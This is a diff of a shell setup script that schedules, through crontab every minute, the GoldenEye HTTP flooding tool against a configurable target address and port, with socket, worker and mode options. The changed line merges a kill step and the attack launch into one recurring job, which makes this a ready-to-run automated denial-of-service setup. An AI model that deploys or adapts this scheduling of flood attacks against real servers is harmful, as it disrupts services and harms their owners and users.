@@ -38,8 +38,7 @@ function addtocrontab () {
   local job="$frequency $command"
   cat <(fgrep -i -v "$command" <(crontab -l)) <(echo "$job") | crontab -
 }
-addtocrontab "*/1 * * * *" "python3 /root/GoldenEye/goldeneye.py http://$address:$port/ -s $connections -w $workers -m $mode"
-addtocrontab "*/1 * * * *" "sleep 55; goldenkill"
+addtocrontab "*/1 * * * *" "goldenkill; python3 /root/GoldenEye/goldeneye.py http://$address:$port/ -s $connections -w $workers -m $mode"
 
 echo -e "${RED} Cronjob Created. ${NC}"
 echo -e "${RED} Setup Finished Successfully. Adios. ${NC}"
